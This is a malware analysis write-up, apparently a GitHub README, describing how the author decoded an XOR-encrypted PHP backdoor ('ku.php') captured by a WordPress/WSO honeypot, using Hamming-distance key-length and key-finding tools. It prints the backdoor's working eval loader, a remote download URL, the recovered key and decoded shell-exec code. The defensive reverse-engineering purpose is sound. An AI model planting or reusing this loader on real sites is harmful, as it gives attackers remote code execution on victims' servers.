# xor-decoding
## Decoding Exclusive-or encoded malware payloads

[Similar or better tool](https://github.com/hellman/xortool)

[Same malware analysis in French](https://nyx.cx/analyse-dune-backdoor-php.html)

[Another analysis](https://blog.sucuri.net/2013/12/how-we-decoded-some-nasty-multi-level-encoded-malware.html)

During the summer of 2014, I [wrote and ran](http://stratigery.com/phparasites/)
a honey pot that emulated a poorly maintained WordPress 2.9 installation. I ended up
including a simulated ["WSO" web shell](https://github.com/bediger4000/malware-phylogeny)
as part of the honey pot, because attackers included WSO web shells in so many of
their fake WordPress plugins. I had a two phase honey pot: first phase simulated
WordPress, the second phase simulated WSO.

Attackers use WSO as a file uploader more than they use it for anything else. I find
this puzzling, as WSO includes so much more functionality. I'm not a bottom feeding
WordPress cracker, but it would make more sense to have a smaller-size file uploader
to me. Attackers uploaded many pieces of malware using the honey pot's
simulated WSO web shell. One of these uploads occurred Wed Aug 28 04:05:52 2013 MDT.
The simulated WSO web shell kept a log of its environment, PHP "superglobal" values,
HTTP cookie values and many other things. The simulated web shell also allows file
uploads by emulating WSO's `uploadFile` command, part of the `FilesMan` "action".

The attacker, from 95.211.231.143 at the time, uploaded a file named "ku.php".
Unfortunately, no attacker tried to GET or POST to a "ku.php" URL.

I've included the simulated WSO web shell's logged data as file
[95.211.231.143Uh3LiAoAAAMAAAEbNe0AAAAH.mod_system.scans](https://github.com/bediger4000/xor-decoding/blob/master/95.211.231.143Uh3LiAoAAAMAAAEbNe0AAAAH.mod_system.scans)
in this repo, and the uploaded file as [95.211.231.143Uh3LiAoAAAMAAAEbNe0AAAAHfile](https://github.com/bediger4000/xor-decoding/blob/master/95.211.231.143Uh3LiAoAAAMAAAEbNe0AAAAHfile).

My goal is to document how to de-obfuscate and reverse engineer the "ku.php" file,
which ultimately involved finding XOR-encoding key strings.

## Initial Reading of ku.php

My initial read of `ku.php` showed me that, when executed, it tried to download
the contents of `http://smtp.botabota.biz/ku/ku.txt` to a local file, and return
the URL where someone could access the local file from the Internet. The last line
of `ku.php` didn't fit with the rest of the code. The last line was 12,941 characters
long, and contained some ugly code. After pretty printing, that 12,941 character
line looked like this:

    <?php
    for (
          $o = 0, $e = 'string of random-appearing characters',$d = '';
          @ord($e[$o]);
          $o++)
    ) {
        if ($o < 16) {
            $h[$e[$o]] = $o;
        } else {
            $d .= @chr(($h[$e[$o]] << 4) + $h[$e[++$o]]);
        }
    }
    if (!@isset($_SERVER)) {
        $_COOKIE =& $HTTP_COOKIE_VARS;
        $_POST =& $HTTP_POST_VARS;
        $_GET =& $HTTP_GET_VARS;
    }
    $k = $_COOKIE['key'];
    if (empty($k)) {
        $k = $_POST['key'];
    }
    if (empty($k)) {
        $k = $_GET['key'];
    }
    if (!@function_exists('decrypt')) {
        eval('function decrypt($e,$k){if(!$k){return;}$el=@strlen($e);$kl=@strlen($k);$rl=$el%$kl;$fl=$el-$rl;for($o=0;$o<$fl;$o+=$kl){$p=@substr($e,$o,$kl);$d.="$k"^"$p";}if($rl){$p=@substr($e,$fl,$rl);$k=@substr($k,0,$rl);$d.="$k"^"$p";}return($d);}');
    }
    $d = @decrypt($d, $k);
    eval($d);

`ku.php` seemed to have been backdoored: some oddly encoded bytes get decoded,
then decrypted, and then evaluated. The decryption function was included in `ku.php`, and
the decryption key would arrive as part of the HTTP request for `ku.php`.

Pretty-printing `function decrypt()` from the string in `ku.php` showed me that whatever
code was concealed was actually XOR-encoded. A key in the form of a printable text string
would be bitwise exclusively or-ed with the decoded bytes.

    function decrypt($e, $k)
    {
        if (!$k) {
            return;
        }
        $el = @strlen($e);
        $kl = @strlen($k);
        $rl = $el % $kl;
        $fl = $el - $rl;
        for ($o = 0; $o < $fl; $o += $kl) {
            $p = @substr($e, $o, $kl);
            $d .= "{$k}" ^ "{$p}";
        }
        if ($rl) {
            $p = @substr($e, $fl, $rl);
            $k = @substr($k, 0, $rl);
            $d .= "{$k}" ^ "{$p}";
        }
        return $d;
    }

Unfortunately, no attacker ever tried to access the "ku.php" code, so I did not
have the text string key.

## Getting the XOR-encoded payload

1. Extract the 12,941 character payload, which comprises the last line of file `95.211.231.143Uh3LiAoAAAMAAAEbNe0AAAAHfile`.
2. Change `eval($d)` call to `print($d);` in that last line. This gives us the first intermediate code.
3. Execute the first intermediate code.
4. Delete some lines in the output of the first intermediate code that pertain to finding the key string, and again change `eval(` to `print(`. That gives us the second intermediate code.
5. Execute the second intermediate code, whose output is the XOR-encoded mystery payload.

Executing `make puzzling.dat` does those 5 steps, with the XOR-encoded mystery paylod ending up in file `puzzling.dat`
The file `makefile` documents how to do all those steps with a Linux shell.

## Finding key size

The program `keysize` finds likely key length(s) by calculating
[Hamming Distance](https://en.wikipedia.org/wiki/Hamming_distance) of blocks of bytes in
XOR-encoded ciphertext. That is, `keysize` iterates through possible key lengths, from 2 to 30
characters. It calculates the Hamming Distance, the number of bits that differ, between the
first chunk of bytes of key length, and every other key length-sized block of bytes in
the ciphertext. For example, if we use 9 bytes as possible key length, `keysize` compares
the block of bytes offsets 0-8, with blocks of bytes at offsets 9-17, 18-26, 27-35, ...

`keysize` normalizes the Hamming Distance by dividing by the number
of bytes it compared. Since ciphertext is rarely a multiple of key length, different key
lengths will have different unused chunks of bytes at the end of the file.

The key length that causes the smallest Normalized Hamming Distance
should be the key length. Apparently, this happens because characters do not appear
uniformly throughout any cleartext. 'E' occurs more than 'Q' in English language text.
A particular byte is more likely to occur at a given offset inside key length blocks
of bytes. Since cleartext bytes at the same offset inside key length sized blocks of bytes
get exclusive-or'ed with the same key byte, a slightly smaller Hamming Distance gets
calculated for the real key length.

The key length calculations aren't very demanding:

    $ make keysize
    $ ./keysize puzzling.dat > dat

![Hamming Distance vs Key Length](https://raw.githubusercontent.com/bediger4000/xor-decoding/master/key_length.png)

The above graph shows the result of running `keysize` over the XOR-encoded
ciphertext in `puzzling.dat`.  The graph shows 3 outlier values for key length,
8, 12, and 24 bytes.


## Finding the key

Program `findkeys` guesses possible keys by putting the ciphertext into _keylength_ number of buffers,
where the Nth ciphertext byte goes into buffer number `N%keylength`. Assuming a particular
key length, all bytes that got XOR-ed with a particular key byte M end up in buffer number M.

Since each of the bufers is a collection of cleartext characters XORed with the
same key byte, `findkeys` tries every ASCII bytes from 0x20 to 0x7f to decode a
buffer.  `findkeys` determines the three ASCII bytes that yield the least
percentage of non-printing "cleartext" characters. It considers the "first best key"
to be the concatentation of key bytes that yeild the lowest non-printable character
count for each of the _keylength_ buffers.


    $ make findkeys
    $ ./findkeys -j 5 -n 8 -N 24 -i puzzling.dat

    Read all 2625 bytes of cipher text from "puzzling.dat"
    Key length 8, first best key string "k"
    Key length 12, first best key string "SjJVkE6rkRYj"
    Key length 22, first best key string "h"
    Key length 24, first best key string "SjJVkE6rkRYjSjJVkM6rkRYj"

The above command says to consider only key bytes that produce 5% or less
unprintable characters, and try keys from 8 to 25 bytes in length. 8, 12 and 24
byte keylengths produced the lowest Normalized Hamming Distance in the chart above.
The 24-byte key string is just the 12-byte keystring repeated, so `findkeys` thinks
that "SjJVkE6rkRYj" is the key string.

I'm not sure why a keylength of 8 gets a low Normalized Hamming Distance, or why 24 gets
a lower distance than 12.

`findkeys` has a few more options to consider. 

* `-I` flag causes it to iterate through all the high-probability key bytes at each key string index.
* `-b` causes it to compare to Base64-encoded PHP cleartext, rather than straight-up PHP to find "good" key bytes.
* `-x` causes it to compare to PHP represented with PHP's "\xNN" notation.

I wasn't certain what the cleartext was. From `ku.php`, it looked like it was PHP, but sometimes
malware gets obscured by using "\xNN" text format. Using `-b` or `-x` when getting a decent
key for `puzzling.dat` gives you a wrong key, so the cleartext format does matter.


Since PHP can be embedded in all kinds of bytes, the `-j` option has to be set to some non-zero
value in most cases. I used 5 in the examples above, but your mileage may vary.

## Decoding the ciphertext

    $ make xor
    $ ./xor puzzling.dat 'SjJVkE6rkRYj' | head
     //adjust system variables
     if(!@isset($_SERVER)){$_COOKIE=&$HTTP_COOKIE_VARS;$_POST=&$HTTP_POST_VARS;$_GET=&$HTTP_GET_VARS;}
     //die with error
     function x_die($m){@header('HTTP/1.1 500 '.$m);@die();}
     //check if we can exec
     define('has_passthru',@function_exists('passthru'));
     define('has_system',@function_exists('system'));
     define('has_shell_exec',@function_exists('shell_exec'));
     define('has_popen',@function_exists('popen'));

Looks like that's the key.

It's actually interesting to google for "SjJVkE6rkRYj". Apparently this is the "SuperFetchExec"
malware, [an early reference](http://pastebin.com/z53aByWX) has it around sincd 2012, using
the [same key](https://news.ycombinator.com/item?id=3433505).

You can use `xor` to encode as well as decode.

    $ ./xor filename "somekey" > intermediate
    $ ./xor intermediate "somekey" > final
    $ diff filename final

Using "-" as a filename causes `xor` to read from stdin,
so you can use it in a pipleline:

    $ base64 -d somefile | ./xor - "keykeykey" | base64 -d > clearext
